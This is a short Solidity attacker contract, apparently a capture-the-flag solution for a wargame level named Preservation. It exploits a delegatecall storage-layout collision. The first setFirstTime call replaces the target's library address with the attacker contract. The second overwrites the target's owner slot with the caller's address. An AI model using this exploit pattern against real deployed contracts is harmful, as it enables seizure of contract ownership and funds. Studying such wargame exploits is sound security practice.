// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

contract PreservationAttacker {
    address public variable1;
    address public variable2;
    address public owner;
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        IPreservation(challengeInstance).setFirstTime(uint256(uint160(address(this))));
        IPreservation(challengeInstance).setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint _timeStamp) external {
        owner = address(uint160(_timeStamp));
    }
}